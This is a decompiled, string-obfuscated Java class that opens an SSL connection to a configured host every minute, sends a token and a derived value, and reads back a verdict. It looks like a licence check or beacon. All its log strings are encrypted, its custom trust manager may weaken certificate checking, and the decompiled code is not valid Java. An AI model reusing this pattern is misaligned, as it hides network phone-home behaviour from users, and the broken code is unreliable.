/*
 * Decompiled with CFR 0.150.
 */
package agent.human;

import agent.human.K;
import agent.human.L;
import agent.human.Main;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.UnknownHostException;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;

public class c
implements Runnable {
    private K F;
    public static byte[] ALLATORIxDEMO = K.ALLATORIxDEMO("v@j\u0007y=k\u000el\u0005/X=\u001f").getBytes();

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    @Override
    public void run() {
        c a;
        L l = new L(a);
        while (true) {
            try {
                ObjectOutputStream objectOutputStream;
                SSLContext sSLContext = SSLContext.getInstance(K.ALLATORIxDEMO("1^."));
                TrustManager[] arrtrustManager = new TrustManager[1];
                arrtrustManager[0] = l;
                sSLContext.init(null, arrtrustManager, new SecureRandom());
                SSLSocket sSLSocket = (SSLSocket)sSLContext.getSocketFactory().createSocket(a.F.ALLATORIxDEMO(), a.F.ALLATORIxDEMO());
                sSLSocket.setSoTimeout(3000);
                ObjectOutputStream objectOutputStream2 = new ObjectOutputStream(sSLSocket.getOutputStream());
                ObjectInputStream objectInputStream = new ObjectInputStream(sSLSocket.getInputStream());
                byte[] arrby = Main.ALLATORIxDEMO();
                ObjectOutputStream objectOutputStream3 = objectOutputStream2;
                objectOutputStream3.writeObject(arrby);
                objectOutputStream3.writeObject(Main.ALLATORIxDEMO(arrby, ALLATORIxDEMO));
                objectOutputStream3.flush();
                if (((Boolean)objectInputStream.readObject()).booleanValue()) {
                    System.out.println(K.ALLATORIxDEMO("VCPBJ\ryBy\nhBk\u000el\u0005!Bo\u0017yBa\rb\t~Ba\u000bf\u0007-\u000byE~Bh\fn\u0010t\u0012y\u0007iL#L"));
                    arrby = (byte[])objectInputStream.readObject();
                    arrby = (byte[])objectInputStream.readObject();
                    objectOutputStream = objectOutputStream2;
                } else {
                    System.out.println(K.ALLATORIxDEMO("9,?-+-\u0005x\u0007~\u0011-+-\u0006d\u0006cEyBz\u0003c\u0016-\u0003-\u0004a\u0003jL#L"));
                    objectOutputStream = objectOutputStream2;
                }
                objectOutputStream.close();
                objectInputStream.close();
                sSLSocket.close();
            }
            catch (UnknownHostException unknownHostException) {
                System.out.println(K.ALLATORIxDEMO("X\fl\u0000a\u0007-\u0016bBn\rc\u0016l\u0001yBe\r~\u0016-X*J"));
            }
            catch (IOException | ClassNotFoundException | GeneralSecurityException exception) {
                System.out.println("Error: " + exception);
            }
            try {
                Thread.sleep(60000L);
                continue;
            }
            catch (InterruptedException interruptedException) {
                System.out.println(K.ALLATORIxDEMO("D\fy\u0007\u007f\u0010x\u0012y\u0007iN-\nb\u0015-\u0010x\u0006hC"));
                continue;
            }
            break;
        }
    }

    public c(K a) {
        c a2;
        a2.F = a;
    }
}